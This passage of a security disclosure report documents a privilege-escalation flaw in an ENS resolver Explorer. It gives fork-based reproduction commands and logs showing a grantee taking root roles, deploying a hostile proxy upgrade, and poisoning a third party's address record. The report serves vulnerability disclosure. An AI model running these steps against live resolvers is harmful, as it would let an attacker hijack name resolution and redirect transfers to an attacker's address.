```bash
anvil --fork-url <SEPOLIA_RPC> --fork-block-number 11658650 --port 8911 --silent &
RPC=http://127.0.0.1:8911 bash E8-15_upgrade_ceiling.sh
```

Executed (`poc/E8-15_upgrade_ceiling.log`): the beneficiary `0xa1618a47…`, whose only real authority was one text key on one name it does not own, is granted root `ROLE_UPGRADE` by the app's own calldata (`status 0x1`), deploys the hostile implementation `poc/E8-15_upgrade_ceiling.sol`, and calls `upgradeToAndCall` (`status 0x1`). The proxy's implementation slot flips from the real `PermissionedResolver` to the attacker's contract, after which `addr()` for `investorb.namegate.eth` **and for any random node** returns `0x…DeadBeef`, and `pwned()` returns the marker string.

Every name the resolver serves now resolves to the attacker, permanently, from one ticked checkbox. The one honesty note travels with it: this requires the operator to tick *Upgrade* rather than *Set Address* — both offered on the same blank-scoped row, both routed to root by the same empty display string. Details and the disclosure are in the log's own footer.

***

### 4. The same defect, across an ownership line — executed

Runs 1 and 2 again, unmodified, against `0x980ea45e…`. Nothing in the method changes: the same application modules, the same one ticked checkbox, the same A/B control from one snapshot. What changes is whose names the resolver serves.

`poc/E8-15_crossowner_pipeline.ts` differs from `E8-15_app_pipeline.ts` in one respect only — it does not hardcode which name and key the flagged row is scoped to. It reads that from the indexer's `ResolverDetail.namedResources`, the field the application publishes and never queries, and then **verifies it** by recomputing the resource locally:

```
namehash(investora.namegate.eth) = 0xaa14cb58…
keccak256("compliance.kyc")      = 0xbaa7ee85…
resource(node ‖ part)            = 0x47c6acdb…
indexer role row                 = 0x47c6acdb…
MATCH? true
```

That is the report's own proposed fix, used to *identify* the row — never to build the transaction.

**Who is who, from the app's own selection set** (`useResolverOverview.ts:66-108` selects `nodes { name owner { id } }`), read from the indexer:

```
8 names, 6 distinct owner addresses  <- what the Explorer renders
  signer  (sole ROOT holder) 0x909bad90…  owns investore.namegate.eth
  grantee (the edited row)   0xa1618a47…  owns none of them
  its ONLY role: ROLE_SET_TEXT on the text key 'compliance.kyc'
                 of investora.namegate.eth — owned by 0xe07b6c41…
```

**Those are the application's numbers, not title.** Run 4b below replaces them with a registry read at the pinned block, where two of the eight labels turn out to have expired. Nothing in the result changes; the counts do. Run 4b is the one to quote.

The app's pipeline emits, for one ticked checkbox on that row:

```
calldata   0x072d5d77…0001…a1618a4715f665b0ab399e50d09f8436e6b00510
bytes      68        selector 0x072d5d77 = grantRootRoles(uint256,address)
control    0xbbd9abb5 = authorizeNameRoles(bytes,uint256,address,bool)   196 bytes
```

```bash
anvil --fork-url <SEPOLIA_RPC> --fork-block-number 11658650 --port 8563 --silent &
RPC=http://127.0.0.1:8563 bash E8-15_crossowner_consequence.sh
```

Output — **condensed** from `poc/E8-15_crossowner_consequence.log`; every value below appears in that log, which is the verbatim record:

```
1. BASE STATE
  grantee setText(investora, 'compliance.kyc')   : OK       <- its entire real grant
  grantee setAddr(investora)  owner 0xe07b6c41…  : REVERT
  grantee setAddr(investorb)  owner 0x31faa2f6…  : REVERT
  grantee setAddr(investord)  owner 0x91af90ef…  : REVERT   <- see the note below
  grantee setAddr(investore)  owner 0x909bad90…  : REVERT

2. BRANCH A — the calldata the application actually emits
  grantRootRoles(1, grantee)   status 0x1   gasUsed 62740
  grantee setAddr(investora)  owner 0xe07b6c41…  : OK
  grantee setAddr(investorb)  owner 0x31faa2f6…  : OK
  grantee setAddr(investord)  owner 0x91af90ef…  : OK       <- see the note below
  grantee setAddr(investore)  owner 0x909bad90…  : OK
  grantee WRITES investorb's address record      status 0x1
  addr(investorb.namegate.eth, 60) now : 0x…deadbeef

3. BRANCH B (CONTROL) — same snapshot, correctly scoped calldata
  authorizeNameRoles(investora, 1, grantee, true)   status 0x1
  grantee setAddr(investora)  owner 0xe07b6c41…  : OK       <- the intended grant lands
  grantee setAddr(investorb)  owner 0x31faa2f6…  : REVERT   <- still refused
  grantee setAddr(investord)  owner 0x91af90ef…  : REVERT   <- see the note below
  grantee setAddr(investore)  owner 0x909bad90…  : REVERT   <- still refused
```

**The `investord` rows are withdrawn.** The `owner 0x…` annotations in this run are labels taken from the indexer, and for `investord.namegate.eth` that label is wrong: at block 11658650 the name had **expired** (`findExpiry` 1788620992 against a block timestamp of 1788839496), `findOwner` returns `0x0` and `getResolver` returns `0x0`. Its probe therefore establishes nothing about a live name. **Run 4b re-runs this experiment with title read from the registry and probes only names proved live, served by this resolver and third-party-owned.** The rest of this block stands: the `investora`, `investorb` and `investore` rows are all confirmed on chain in run 4b, and the write that was sent — `investorb` — is live, owned by `0x31faa2f6…` and served by this resolver at that block.

`investorb.namegate.eth` belongs to `0x31faa2f6…`, who is neither the party that signed nor the party that benefited. The record on it was written by an account whose entire on-chain authority, one transaction earlier, was a single text key on a different name.

Every `REVERT` above carries the resolver's own EAC error `0x4b27a133` — that is `EACUnauthorizedAccountRoles(uint256 resource, uint256 roleBitmap, address account)`, whose **first word is the resource the contract checked**. The log recomputes `keccak256(namehash(<name>) ‖ bytes32(0))` locally for all four names in its fixtures block, immediately before the probes, so the two columns can be read against each other on the page: each recomputed value is the value the contract echoes back. The contract therefore confirms the resource formula from its own error data, on four separate names. **The resource column is measured; the `owner` column on those same lines is a label** — which is why run 4b exists.

**What was simulated and what was sent, stated exactly.** The `OK`/`REVERT` lines are `cast call` probes: they establish what the EVM *would* permit, which is the authority question. Exactly **one** state-changing write was sent by the grantee — `setAddr` on `investorb.namegate.eth`, tx `0x48791670…` — and its result is read back from the chain in the line beneath it. The grant itself and the control are also real transactions (`cast send`, both `status 0x1`).

***

### 4b. The same run, with title read from the registry on chain

Run 4's `owner 0x…` annotations came from the indexer — the field the Explorer renders. That is the right source for a claim about the **screen**, and the wrong one for a claim about **title**. This run replaces them with measurements.

```bash
anvil --fork-url <SEPOLIA_RPC> --fork-block-number 11658650 --port 8570 --silent &
RPC=http://127.0.0.1:8570 bash E8-15_crossowner_title.sh
```

For each of the eight labels the Explorer lists, it calls `findOwner(string)`, `findExpiry(string)` and `getResolver(string)` on the `namegate.eth` `UserRegistry` `0xbb8e69d0d42300843cb75e224ee60b7fa4e840cc` at the fork block, classifies the name, and then probes **only** names proved live, served by this resolver and owned by someone other than the signer (`poc/E8-15_crossowner_title.log`, section 1):

```
label                       findOwner                                    expired?  resolver == 0x980ea45e…?
investora                   0xe07B6c410590B998F3E16bf90507F9Be38bF6176   no        yes
investorb                   0x31fAA2F62490F43fb5BaeaF01C5eef8C8f170bFF   no        yes
investorc                   0x418e5e95B14145c698f1BAE6D07FE696B07f7Fe1   no        yes
investord                   0x0000000000000000000000000000000000000000   YES       no
investore                   0x909BAd90d6Ec72cB1Ff9e37C8309B1C0b245f735   no        yes   <- the SIGNER
investorf                   0x31fAA2F62490F43fb5BaeaF01C5eef8C8f170bFF   no        yes
investorexpired             0x0000000000000000000000000000000000000000   YES       no
investortest1788796668981   0x000000000000000000000000000000000000dEaD   no        yes   <- burned

  labels in the app's selection set                       8
  of those, this resolver is the live resolver for        6
  live, served, owned by someone other than the signer    4   -> investora investorb investorc investorf
  distinct live third-party owners                        3
```

and then the same three states, over those four names only:

```
2. BASE STATE
  BEN setText(investora, 'compliance.kyc')                       : OK   <- its ENTIRE real grant
  BEN setAddr(investora)  on-chain owner 0xe07B6c41…             : REVERT (resource 0xc4899518…)
  BEN setAddr(investorb)  on-chain owner 0x31fAA2F6…             : REVERT (resource 0xd063c877…)
  BEN setAddr(investorc)  on-chain owner 0x418e5e95…             : REVERT (resource 0x5a7907d3…)
  BEN setAddr(investorf)  on-chain owner 0x31fAA2F6…             : REVERT (resource 0xacde96a5…)

3. BRANCH A — grantRootRoles(1, BEN), 68 bytes, status 0x1
  BEN setAddr(investora / investorb / investorc / investorf)     : OK OK OK OK
  BEN SENDS setAddr(investorb)   status 0x1   tx 0x48791670…
  addr(investorb.namegate.eth, 60)                               : 0x…deadbeef
  investorb on-chain owner at this block                         : 0x31fAA2F6…

4. BRANCH B (CONTROL) — authorizeNameRoles(investora, …), 196 bytes, status 0x1
  BEN setAddr(investora)                                         : OK      <- the intended grant
  BEN setAddr(investorb / investorc / investorf)                 : REVERT REVERT REVERT
```

**What this run changes and what it does not.** It changes the counts: not *eight names under six owners* but **four live third-party names under three owners**, because `investord` and `investorexpired` had expired before the block and the indexer's owner field is expiry-blind. It does not change the result: the same 68 bytes, the same escalation, the same single write on `investorb.namegate.eth` — whose owner, expiry and resolver are now all read from the registry — and the same control refusing it. The transaction hashes are identical to run 4's, because both runs send the same calldata from the same base state on a fork pinned to the same block.

Every resource in the `REVERT` lines is recomputed locally by the script and matched against the first word of the contract's own `0x4b27a133` error, which is `EACUnauthorizedAccountRoles(uint256 resource, uint256 roleBitmap, address account)`.

***

### 5. The screen, rendered — twice, two harnesses, no network

Everything above is calldata. This run is the other half of the consent claim: what the operator is looking at when they produce it. It is done twice, because the two harnesses answer different objections.

**(a) In the repository's own test runner.** `poc/E8-15_render_screen.test.tsx` is a `vitest` file that mounts the app's real `ResolverRolesTable` — which pulls in `ResolverRolesSidebar`, `prepareResolverRolesIntent`, `grantResolverRoles.ts` and ensjs's encoder — under `apps/portal/vitest.config.ts`, the config the project ships.

```bash
cp <packet>/poc/E8-15_render_screen.test.tsx apps/portal/src/
cd apps/portal && pnpm vitest run src/E8-15_render_screen.test.tsx --reporter=verbose
```

**Ten tests, ten passing** (`poc/E8-15_render_screen.log`). Nine assert; the tenth prints the transcript quoted below. The nine, verbatim from the run:

```
ENS-007 — the resource the row really holds > the live role row is a TEXT-KEY resource, and the app can only compute the part-0 one
ENS-007 — what the operator is shown > the Name column is blank on a text-key-scoped row
ENS-007 — what the operator is shown > the sidebar prints NO scope line — neither "Global roles" nor "Roles scoped to"
ENS-007 — what the operator is shown > the CONTROL row — a part-0 resource — does print its scope and its name
ENS-007 — what the wallet is asked to sign > one ticked checkbox on the text-key-scoped row emits grantRootRoles
ENS-007 — what the wallet is asked to sign > the CONTROL — the same tick on a resolvable row emits authorizeNameRoles
ENS-007 — what the wallet is asked to sign > the modal shows the operator no scope at all before they sign
ENS-007 — the beneficiary is never the signer > the app refuses to edit the connected account’s own row
ENS-007 — "Remove user from all roles" on the same row > emits revokeRootRoles, which clears a resource the row does not sit on
```

The row's resource is **computed in the test from the protocol formula**, not pasted: `keccak256(namehash('acmestudio.sideloadtest26.eth') ‖ keccak256('agent_session'))`, and the first assertion checks it equals `0x387d89ea…`, the value the indexer returns for that live row. So the fixture is tied to real chain state rather than standing in for it.

Its transcript, side by side — the same component, the same account, the same role, the same names; **the only difference is the role row's `resource`**:

```
DEFECT   resource on the row        0x387d89ea…   = keccak256(node ‖ keccak256("agent_session"))
         Name cell innerHTML        ""
         scope line                 <<NO <p> IN THE SIDEBAR>>
         modal title                Save resolver role changes
         modal transactionName      Update roles for 0x49d037a6943eb6a1eef98c443beaf1f37402ce2d
         selector                   0x072d5d77          grantRootRoles(uint256,address)
         calldata bytes             68

CONTROL  resource on the row        0x5c0b53d5…   = keccak256(node ‖ bytes32(0))
         Name cell innerHTML        "<div …><span …>acmestudio.sideloadtest26.eth</span></div>"
         scope line                 Roles scoped to acmestudio.sideloadtest26.eth
         modal title                Save resolver role changes
         modal transactionName      Update roles for 0x49d037a6943eb6a1eef98c443beaf1f37402ce2d
         selector                   0xbbd9abb5          authorizeNameRoles(bytes,uint256,address,bool)
         calldata bytes             196
```

(The `innerHTML` line is elided at the two `…`; every other value is the log's, character for character. The full string is in `poc/E8-15_render_screen.log`.)

Those 68 bytes are **byte-identical** to the calldata run 1 produced from live indexer data and run 2 sent on the fork. Three independent paths — module pipeline, rendered UI, fork transaction — reach the same call.

Note the modal line: it is the same string in both branches. **The one screen that could still warn the operator is identical whether the grant is scoped to one name or to every name on the resolver.**

*What is mocked, stated exactly.* Wallet and router plumbing, and `TransactionModal` — which is replaced by a recorder that calls the very same `intent.prepare(…)` the real modal calls at `EstimatedGasCost.tsx:77-93`, with the same argument shape, so the recorded calldata is the calldata the real modal estimates and the wallet is handed. Nothing in the scope path is mocked: `buildResourceToNameMap`, `groupRolesByAccount`, the sidebar's `roleName` expression, the `name === ''` ternary and ensjs's encoder all run as shipped.

**(b) In a real browser, with the app's own stylesheet.** For the objection that a DOM assertion is not a screen, `poc/E8-15_screen_entry.tsx` mounts the same table under the app's own providers — the ones `routes/__root.tsx` uses — served by the repository's own vite dev server, and `poc/E8-15_screen_shots.mjs` drives the repository's own Playwright Chromium over it.

*What this harness supplies, stated as exactly as for (a).* It is **not** the `/resolver/$address/roles` route: it mounts the same components twice so the defect row and its control sit on one screen. Three inputs are supplied rather than fetched, and none is on the scope path: the role rows and node list (fixtures — the resource is **computed** from the protocol formula, not pasted); the mock wallet (the repository's own `VITE_USE_MOCK_WALLET` auto-connect, `src/lib/mockWallet.mock.ts`); and `canManageRoles = true` (`E8-15_screen_entry.tsx:88`), which in the live route is the result of `hasRoles(ROLE_SET_ADDR)` for the connected account (`routes/resolver/$address/roles/index.tsx:41-50`). Supplying that last one is what puts the harness in the operator's seat — it is the same gate the *Steps to reproduce* section says the edit affordance sits behind — and it changes nothing about the scope the flow then computes. Everything on the screens is the app's: the Name cell, the scope sentence, the permission list, the confirmation strings, and the calldata. Four PNGs (`poc/screens/`), reproducing byte-identically across runs.

> **Where to find them.** A gist holds text only, so the four PNGs are in this report's **Attachments** field, not in the secret gist. `poc/E8-15_screen_shots.log` — which *is* in the gist — carries their sha256 sums, their producers, and a description of each, so the run is checkable from the gist alone. **Nothing in this report depends on the images**: every claim they illustrate is asserted and printed as text in `poc/E8-15_render_screen.log`, from the repository's own test runner. The screenshots are corroboration in pixels, not the evidence of record.

| file                                | what it shows                                                                                                                                                                                                      |
| ----------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `1-roles-table-name-column.png`     | the two rows side by side. **A** (text-key-scoped): the Name column is empty. **B** (part-0 control): it reads `acmestudio.sideloadtest26.eth`                                                                     |
| `2-sidebar-no-scope-line.png`       | the sidebar on row A — between the account header and the permission list there is nothing                                                                                                                         |
| `3-sidebar-control-scope-line.png`  | the same sidebar on row B — in that same place, *"Roles scoped to acmestudio.sideloadtest26.eth"*                                                                                                                  |
| `4-confirmation-before-signing.png` | row A, one checkbox ticked, Save pressed: the last screen before the wallet prompt. In full: *"Save resolver role changes / Update roles for 0x49d037a6943eb6a1eef98c443beaf1f37402ce2d / Est. cost: Unavailable"* |

The gas estimate reads *Unavailable* because this render has no RPC. It is disclosed rather than cropped, and no claim rests on it.

**The beneficiary can never be the signer, and that is enforced by the app.** `ResolverRolesSidebar.tsx:353-359` computes `canEdit = canManageRoles && !isSelf`, where `isSelf` compares the row's account to the connected address; the Save and Remove affordances are gated on `canEdit` and the permission list is `pointer-events-none` when `isSelf`. The test asserts it: on a row whose account **is** the connected operator, no Save button and no Remove button render. So the account that receives resolver-wide authority is always an account other than the one signing — structurally, not as a fact about the population that was sampled.

***

### 6. The record, rendered by the application itself

Runs 4 and 4b end at the chain. This one carries the result one step into the audited asset and asks what the Explorer then shows a visitor.

`poc/E8-15_poison_for_render.sh` performs exactly the two transactions branch A already performs — the operator signs the 68 bytes the Explorer emits for one ticked checkbox, then the grantee writes the coin-60 address record of `investorb.namegate.eth` — and **stops there instead of reverting**, so the fork can be browsed. The repository's own vite dev server then serves the **unmodified** Explorer with `VITE_SEPOLIA_RPC_URL` pointed at that fork.

```bash
anvil --fork-url <SEPOLIA_RPC> --fork-block-number 11658650 --port 8575 --silent &
RPC=http://127.0.0.1:8575 bash E8-15_poison_for_render.sh
cd apps/portal && VITE_SEPOLIA_RPC_URL=http://127.0.0.1:8575 pnpm vite --port 5200 &
cd e2e && node E8-15_render_resolution.mjs ./out
```

The page's record **values** are read from chain, not from the indexer (`features/profile/hooks/useProfile.ts:106` → `useRecords.ts:22-25`, ensjs `getRecords` over the wagmi client; the indexer only supplies which coin types to ask for, and coin 60 is in the default list unconditionally at `useProfile.ts:74-88`). That is why the fork's state is what appears.

What `/investorb.namegate.eth/address` renders (`poc/E8-15_render_resolution.log`, and `poc/screens/5-explorer-renders-the-poisoned-record.png`):

```
Address Resolution
Network    Record                                        Reverse match
Default    null                                          —
Mainnet    0x00000000000000000000000000000000DeaDBeef    False
Optimism   null                                          —
…
```

**Read the Reverse match column: it says False, and it is quoted here rather than cropped.** The Explorer marks the record as not reverse-verified, because the written address holds no ENSIP-19 reverse record naming that name (`AddressResolution/columns.tsx:22-41`, `useReverseMatch.ts:234-241`). That is a real partial mitigation **on this one view**. It is absent from the transfer surface described in the Bug Description, which shows the recipient's full resolved address with no reverse check (`SendNameForm.tsx:276-281`), and it does not change what the resolver returns to a client that performs no reverse check. **No claim is made that any user sent anything anywhere; none did.**

***

### 7. What the application then does with that record — the transfer recipient

Run 6 shows the Explorer displaying the poisoned record. This run shows what the application **does** with it, and it is the step that decides the impact row.

`poc/E8-15_transfer_entry.tsx` mounts the app's **unmodified `SendNameForm`** — the component `routes/$name/ownership/transfer.tsx:196` mounts — under the app's own providers, with `VITE_SEPOLIA_RPC_URL` pointed at the fork left in the post-grant state.

```bash
anvil --fork-url <SEPOLIA_RPC> --fork-block-number 11658650 --port 8581 --silent &
RPC=http://127.0.0.1:8581 bash E8-15_poison_for_render.sh
cp E8-15_transfer_entry.tsx apps/portal/src/ ; cp E8-15_transfer.html apps/portal/
cd apps/portal && VITE_SEPOLIA_RPC_URL=http://127.0.0.1:8581 pnpm vite --port 5201 &
cd e2e && node E8-15_transfer_resolution.mjs ./out
```

Nothing in the resolution is stubbed. `SendNameForm.tsx:81-82` calls `useAddressResolution`, which reaches `resolveAddressOrName` (`features/roles/helpers/addUser.handlers.ts:20-23`) and `getEnsAddress` over the wagmi client — the real `addr` record, read from the fork. The ENS owner is consulted **only as a fallback** *"for names that do not set an address record"* (`:27-34`), so a record that is set always wins.

Output (`poc/E8-15_transfer_resolution.log`; `poc/screens/6b-transfer-recipient-resolved.png`):

```
  [!] Transferring ownership of an ENS name is irreversible.
    Make sure you check the recipient address before proceeding.      <- the app's own warning

  Recipient
    investorb.namegate.eth
    0x00000000000000000000000000000000DeaDBeef                        <- what the app resolved it to

  [ Transfer name ]        enabled: true
```

The address the application tells the user to check is the one the over-privileged grantee wrote. `SendNameForm.tsx:100-101` gates the button on `canStart` (from `hasValidRecipient` at `:89`); `:106-109` is `runTransfer → startTransfer({ recipient, options })` with that same address.

Mounting the form directly rather than navigating to the route skips **only** the route's ownership gate (`transfer.tsx:102-104`, which requires the connected wallet to equal the name's owner). That gate decides *who may open the form*; it takes no part in resolving the recipient.

**Not claimed:** that a transfer was broadcast. None was — no wallet is connected in this harness and no transaction was sent. The final hop is one cited line.

The same `useAddressResolution` hook is reused by `ResolverAddUserSheet`, `RolesAddUserSheet`, `RegistryAddUserSheet` and `routes/$name/create-subname.tsx`, so the same record also decides who receives a role and who receives a subname.

***

### 8. The population

`poc/E8-15_roleconn_sweep.py` pages `roleConnection(first:1000, after:cursor)` to exhaustion, keeps every contract holding at least one non-root resource, separates `PermissionedResolver` proxies from registries by their ERC-1967 implementation slot, and replays the app's logic over each resolver's real rows. A group is flagged **iff** it holds a non-root resource **and** `roleName` evaluates to `''`.

```
run at 2026-09-05T17:04:18Z
role assignments walked (cursor exhausted)        182,113   of totalCount 182,114
distinct contracts in the indexer's role table      6,240
contracts with >= 1 non-ROOT resource                 136
of those, PermissionedResolver proxies                 11
role groups examined on those 11 resolvers             29
AFFECTED groups                                        16
distinct affected resolvers                            10
```

The sweep **reimplements** the four app functions in pure Python (its `keccak256` and `namehash` are self-tested against published vectors before any measurement runs). That reimplementation is now cross-validated: run 1 above executes the *real* functions over one of these resolvers and produces the same classification — 3 affected groups on `0x34b1699b…`, which is what the sweep reports for that resolver.

**Limits, stated rather than smoothed over.** `totalCount` moved from 182,113 to 182,114 during the walk and the cursor descends by id, so rows appended mid-walk are never reached: these are floors at that instant, on a live testnet. They describe the staging indexer's Sepolia view — the only environment this asset targets at this commit (`apps/portal/src/lib/wagmi.ts:67`, `packages/indexer/urql/client.ts:28,36`) — and say nothing about mainnet. Of the 136 candidate contracts, 120 are `UserRegistry`, 2 are `WrapperRegistry` and 3 are not ERC-1967 proxies at all; those 125 were excluded rather than assumed harmless.

**The earlier walk is kept in the record.** `poc/E8-15_probe.py` walked `resolvers(first:100, skip:n)` and reported **2** affected groups on 2026-09-02 (`poc/E8-15_probe.log`). That listing saturates — its walk is capped at `skip=20000` with `first=100` (`E8-15_probe.py:61,66`) and collapsed to the 1,584 distinct addresses its log prints — and it is superseded rather than retracted: of the three affected resolvers that already held their rows when it ran, it found groups on only one, and seven of the ten did not exist yet. One reading note travels with it: `E8-15_probe.log` prints each bitmap as `0x000000000000000000`, which is `E8-15_probe.py:112` slicing a 66-character value to 20 characters for display, not the value.

### 9. Ownership — where a root grant crosses a boundary rather than merely widening

`poc/E8-15_ownership_2026-09-07.log` asks one question of each of the ten affected resolvers: do the names it serves belong to more than one owner?

```
resolvers whose names span more than one owner: 3 of 10
    0x132145725cf0553e226b9e83c461c5f42250e0ee
    0x980ea45e726bfdcb3ca242d767e7ba0acd817251
    0xeb22a41c9b5f979385a045faae72e730bf9d0b0c
```

Producer: `poc/E8-15_ownership_census.py` (standard library, one read-only GraphQL POST per resolver, \~1 minute).

The sharpest is `0x980ea45e…`, and it is the one **runs 4 and 4b execute**. Its census row above is an indexer reading and is **not** what the claim rests on: run 4b (`poc/E8-15_crossowner_title.log`) reads title from the `namegate.eth` `UserRegistry` `0xbb8e69d0…` on chain at fork block 11658650 and finds that of the eight labels the Explorer lists, **six are live and served by this resolver**, of which **four belong to three owners who are neither the signer nor the grantee** (`investora` → `0xe07b6c41…`, `investorb` and `investorf` → `0x31faa2f6…`, `investorc` → `0x418e5e95…`), one is the signer's own (`investore`) and one is the burn address. `investord` and `investorexpired` had expired: `findOwner` and `getResolver` both return zero for them at that block, and the indexer's owner field — being expiry-blind — still names an owner for both. The affected beneficiary `0xa1618a47…` owns none of the eight.

On `0x13214572…` the sole ROOT holder `0x6bd07000…` owns `rugradar.eth`, while `scout.rugradar.eth` and `api.rugradar.eth` belong to `0x129db213…`. On `0xeb22a41c…`, three names under two owners, the ROOT-role holders are `0x78155e1b…` and `0xf6a97d82…` — and `0x78155e1b…` owns none of the three. **Those two rows are indexer readings and are labelled as such**; only `0x980ea45e…`, the resolver the crossing was executed on, has its title established on chain.

This resolver set is a live testnet and the indexer's numbers move — `0x980ea45e…` showed six names on 2026-09-07 and eight on 2026-09-08 — which is exactly why the executed run does not cite this census at all. It pins a fork block and reads the registry at that block.

### The non-vacuity controls, and where each output is

1. **The classification is exhaustive, not a ratio.** The 29 groups examined are 12 whose every resource is ROOT (root scope is correct for those), 1 whose non-root resource *is* the part-0 value and which therefore does display a name, and the 16 flagged. Row-level: **1** non-root row the app can name against **33** it cannot. The single part-0 group, on `0x0e7cd4d9…`, is the positive control — it shows the part-0 branch firing in this same population, so the 16 cannot be an artefact of a broken hash in the measuring script. **Output:** `poc/E8-15_roleconn_sweep.log`, `CONTROLS` block.
2. **The A/B fork control** (§2 branch B) — same base state, same operator, same beneficiary, same ticked role, different calldata, opposite outcome. **Output:** `poc/E8-15_fork_consequence.log`.
3. **The formula check is falsifiable and was nearly falsified.** The part-0 resource does **not** match any live role row on that resolver; only the fine-grained forms do. Had the app's formula been able to produce them, this finding would not exist. **Output:** §1 section B of `poc/E8-15_app_pipeline.log`; earlier capture at `poc/E8-15_resource_derivation.log`.
4. **The bitmaps are read at full width.** Each flagged row on `0x34b1699b…` carries `0x…0010` = 16 = `ROLE_SET_TEXT`; the ROOT row decodes 20 of 20. Across all 16 flagged groups the sweep printed `PROCEEDS` 16 times and `RETURNS EARLY` 0 times, so none is saved by the `decodedRoles.length === 0` gate at `ResolverRolesSidebar.tsx:307-312`. **Output:** `poc/E8-15_bitmap_readout.log`.
5. **All 33 flagged rows carry a `namedResources` entry** from the indexer labelling them `text` or `addr`; **0** did not. That answers the objection that a group might have been flagged only because the indexer returned a short node list — and it is also the fix. **Output:** `poc/E8-15_roleconn_sweep.log`, controls block.
6. **The A/B render control** (§5) — the same React components, the same account, the same role, the same names, one input changed: with a part-0 resource the Name cell fills and the sidebar prints its scope; with the row's real resource both go silent and the calldata changes function. So the blank cell is a consequence of the resource, not of the fixture. **Output:** `poc/E8-15_render_screen.log`; `poc/screens/1-roles-table-name-column.png` and `3-sidebar-control-scope-line.png`.
7. **Title is a measurement, not a label.** Run 4b reads `findOwner` / `findExpiry` / `getResolver` from the registry at the pinned block for every name in the app's selection set, and probes only those proved live, served and third-party. It is the control on run 4's owner annotations, and it caught two expired labels the indexer still names an owner for. **Output:** `poc/E8-15_crossowner_title.log`, section 1.
8. **The checkout is unmodified.** `git status --porcelain` at the pin lists only the untracked PoC files and no modified tracked file, so no run above is against a patched application. **Output:** header of `poc/E8-15_render_screen.log`.

### Provenance of the rows counted above

`poc/E8-15_provenance.log` reads it off the chain rather than asserting it. Resolver `0x34b1699ba597020111510ba53ea2389924c28dbc` was created in tx `0x7c73ca35…` at block 11597785 / 2026-08-30T08:57:48Z by EOA `0x9940798ae6f0f63e96c62ec1b20f2758cc4f6e93` through the public `VerifiableFactory`; `eth_getCode` returns `0x` at 11597784 and 77 bytes at 11597785. All four of its role rows were granted by that same EOA. Every timestamp is `eth_getBlockByNumber(block) .timestamp` — the indexer's own `timestamp` field on a role row is its ingestion time and was not used. Across the population the ten affected resolvers were created by **eight distinct EOAs** over 5.9 days, so this is not one party's fixture. Chain data cannot prove a negative about who controls an address and none is claimed; what is claimed is narrower — **this work sent no transaction on any public chain and holds no key there**, and every artefact is a read-only query, a local computation, or a local fork.

### Steps to reproduce

**Read this first: the Roles page's edit affordance is gated on holding a root role.** `routes/resolver/$address/roles/index.tsx:41-50` queries `hasRoles(ROLE_SET_ADDR)` for the connected account, `ResolverRolesTable.tsx:107` renders the edit column only when that is true, and `ResolverRolesSidebar.tsx:359` gates Save on it as well. A reviewer who opens the live Explorer with an ordinary wallet will therefore **see the row and the blank Name cell, but no edit button** — not because the defect is absent, but because the interface is an operator's. Route A below needs no wallet, no key and no network; it is the route to take. Route B is the same path in the live app, for a reviewer who holds a root role on a resolver.

**Route A — no wallet, no RPC, no chain (about two minutes).** This is §5 above, and it exercises the identical code path: the same `ResolverRolesTable`, the same sidebar expression, the same `name === ''` ternary, the same ensjs encoder.

```bash
git clone <the audited repo> && cd apps-monorepo && git checkout 1c9b47f18fcd && pnpm install
cp <packet>/poc/E8-15_render_screen.test.tsx apps/portal/src/
cd apps/portal && pnpm vitest run src/E8-15_render_screen.test.tsx --reporter=verbose
```

Expect ten passing tests and the transcript in §5. The Name cell is `""`, the sidebar's scope sentence is absent, the confirmation screen names no scope, and the calldata is `grantRootRoles`, 68 bytes, `0x072d5d77`. Flip one constant — `TEXT_SCOPED_RESOURCE` for `NAME_SCOPED_RESOURCE` — and the same components print the name, print the scope sentence, and emit `authorizeNameRoles`.

For the same thing as pixels rather than assertions, add the browser harness:

```bash
cp <packet>/poc/E8-15_screen.html apps/portal/ && cp <packet>/poc/E8-15_screen_entry.tsx apps/portal/src/
cp <packet>/poc/E8-15_screen_shots.mjs e2e/
(cd apps/portal && VITE_USE_MOCK_WALLET=true pnpm vite --port 5199 &)
cd e2e && node E8-15_screen_shots.mjs ./out      # writes the four PNGs of poc/screens/
```

**Route B — in the live application, as an operator.** Requires a wallet holding a root role on the resolver; that is the only account for which the Explorer renders the control at all.

1. Open `/resolver/0x34b1699ba597020111510ba53ea2389924c28dbc` and go to **Roles**.
2. Find the row for `0x49d037a6…`. The **Name** column is blank, and opening the sidebar shows no scope line — neither *"Global roles (all names)"* nor *"Roles scoped to …"*. (`poc/screens/1-roles-table-name-column.png`, `2-sidebar-no-scope-line.png`.)
3. Tick any additional permission and press Save. The confirmation screen reads *"Save resolver role changes / Update roles for 0x49d037a6…"* and nothing else (`poc/screens/4-confirmation-before-signing.png`). Read the transaction your wallet is then asked to sign: selector `0x072d5d77`, `grantRootRoles`, 68 bytes — not `authorizeNameRoles`.
4. **Nothing needs to be signed**; reading the calldata at the prompt is enough. §1 and §2 above are that same path executed end to end, on a local fork.
5. Steps 1-2 alone — the blank Name cell — are visible to **any** visitor, with or without a role, because the table renders for everyone. Only the edit affordance is gated.
6. To see it where the names belong to other people, repeat on `/resolver/0x980ea45e726bfdcb3ca242d767e7ba0acd817251` and find the row for `0xa1618a47…`. That account's only authority is one text key (`compliance.kyc`) on `investora.namegate.eth`, a name it does not own; the calldata the prompt shows is the same `grantRootRoles`, and §4 above sends it and then writes a record on `investorb.namegate.eth`, which belongs to a third party.
